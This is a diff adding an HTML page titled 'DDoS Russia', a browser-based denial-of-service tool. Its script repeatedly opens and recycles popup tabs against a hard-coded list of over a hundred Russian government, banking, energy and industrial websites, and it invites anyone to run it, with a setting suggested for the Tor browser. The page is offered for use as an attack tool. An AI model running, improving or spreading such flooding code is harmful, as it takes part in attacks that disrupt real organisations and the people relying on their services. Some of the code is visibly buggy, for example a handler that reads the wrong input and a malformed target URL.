@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+	<title>DDoS Russia</title>
+
+	<style>
+	  body {}
+	  h1,p {color: blue;}
+
+		#container {
+			width: 500px;
+			margin: auto;
+			top: 0;
+		}
+
+		#topbackground {
+	    position: fixed;
+	    top: 0;
+	    left: 0;
+	    height: 50%;
+			width:100%;
+	    background-color: powderblue;
+		}
+
+		#background {
+	    position: fixed;
+	    top: 50%;
+	    left: 0;
+	    height: 50%;
+			width:100%;
+	    background-color: yellow;
+		}
+	</style>
+</head>
+
+<body>
+	<div id="topbackground">
+		<center><h1>DDoS against select Russian targets</h1></center>
+		<div id="container">
+			<p>Target list updated 03/08/2022 18:276 UTC and contains <span id=theCount></span> targets.</p>
+			<p>Please allow popups for this file. This is the control file. In order to stop generating popups, kill this TAB, then you can close the others.</p>
+			<p><input id="windowcount" type="number" min="1" max="25" onblur="getWindowCount()" value="5" title="1 to 25"> Open how many tabs?</p>
+			<p><input id="windowlive" type="number" min="1" max="25" onblur="getWindowLive()" value="10" title="1 to 30"> Recycle window after how many seconds? TOR browser set to 30</p>
+			<button onclick="openURLs(); return false;">Start</button><br>
+			<button onclick="killAll(); return false;">Stop all</button> **Not functioning yet**<br>
+			<p>
+				This is a quick and easy script that anyone can run in a browser window. The targets are preselected (you can view them).
+			</p>
+		</div>
+	</div>
+	<div id="background">&nbsp;</div>
+</body>
+
+<script type="text/javascript">
+
+data ='{"url":["https://24ecp.ru","https://Acron.ru","https://admin-smolensk.ru/","https://admtyumen.ru/","https://apparat.lenobl.ru","https://astralnalog.ru","https://ati.su","https://B2b.sibur.ru","https://belinfonalog.ru","https://ca.gisca.ru","https://ca.kamgov.ru","https://ca.ntssoft.ru","https://center-inform.ru","https://cfmc.ru","https://cheladmin.ru","https://cit-ufa.ru","https://crypset.ru","https://customs.gov.ru","https://dreamkas.ru","https://e-portal.ru","https://elkursk.ru","https://epnow.ru","https://Eurochemgroup.com","https://eurosib.ru","https://evraz.com/ru","https://gazprom.ru","https://gazPrombank.ru","https://gosuslugi.ru","https://goszakaz.ru/","https://government.ru","https://gruzovozkin.pro","https://icentr.ru","https://icvibor.ru","https://iecp.ru/ep/ep-verification","https://iecp.ru/ep/uc-list","https://imctax.parus-s.ru","https://infotrust.ru","https://izhtender.ru","https://kartoteka.ru","https://kk.bank/UdTs","https://kraskript.com","https://krd.ru","https://kremlin.ru","https://kt-69.ru","https://kursk.ru/","https://lukoil.com","https://lukoil.ru","https://magnit.ru","https://mascom-it.ru","https://mcspro.ru","https://metalloinvest.com","https://midural.ru","https://mil.ru","https://monopoly.ru/","https://mos.ru/uslugi","https://mosreg.ru","https://nalog.gov.ru","https://nangs.org","https://nlmk.com","https://nornickel.com","https://nucrf.ru","https://nwudc.ru","https://omk.ru/","https://Onlinecontract.ru","https://orel-region.ru","https://orenburg-gov.ru/","https://otchet-online.ru","https://pfr.gov.ru","https://polymetalinternational.com/ru/","https://rcarus.ru","https://region-am.ru/","https://region.ru/","https://rk72.ru","https://rkn.gov.ru","https://rmk-group.ru/ru/","https://roseltorg.ru","https://Rosneft.com","https://rsbis.ru/elektronnaya-podpis","https://sber-am.ru/","https://sberbank.ruvtb.ru","https://sberfn.ru/","https://severstal.com","https://sibur.ru","https://squaretrade.ru","https://star-pro.ru/","https://structure.mil.ru/structure/uc/info.htm","https://stv-it.ru","https://surgutneftegas.ru","https://tafneft.ru","https://tektorg.ru","https://tmk-group.ru","https://Transneft.ru","https://uc-osnovanie.ru/","https://ucestp.ru","https://ucpir.ru","https://udcs.ru","https://ul.su/","https://ulgov.ru","https://Uralchem.com","https://uralkali.com/ru/","https://vologda-oblast.ru/","https://www.admoblkaluga.ru","https://www.astrobl.ru","https://www.bryanskobl.ru/","https://www.ingosinvest.ru/","https://www.region.tver.ru/","https://www.stavregion.ru","https://www.tula.ru","https://www.volgograd.ru","https://www.vtbcapital-pr.ru/","https://www.yarregion.ru/default.aspx","https://y-center.ru","https://ya.ru"]}'
+
+const dataobj = JSON.parse(data);
+var numWindows = 5;
+var dataIndex = 0;
+var windowlivesec = 10000;
+var dataLength = dataobj.url.length;
+
+$( '#theCount' ).html(dataLength);
+
+function getWindowCount() {
+	numWindows = $( "#windowcount" ).val();
+}
+
+function getWindowLive(){
+	 windowlivesec = $( "#windowcount" ).val() * 1000;
+}
+
+function closeOnLoad(myLink)
+{
+  var newWindow = window.open(myLink);
+  setTimeout(
+             function()
+             {
+               newWindow.close();
+							 openAnother();
+             },
+             windowlivesec
+            );
+  };
+
+function openAnother(){
+	dataIndex++;
+	//console.log(dataLength);
+	if (dataIndex == dataLength) {
+		dataIndex = 0;
+	}
+	closeOnLoad(dataobj.url[dataIndex]);
+	//console.log(dataIndex,dataobj.url[dataIndex]);
+}
+
+function openURLs(){
+	for (let i = 0; i < numWindows; i++) {
+	  closeOnLoad(dataobj.url[i]);
+		dataIndex = i;
+	}
+}
+
+function killAll(){
+	throw new Error("Killed!");
+}
+
+</script>
+
+</html>
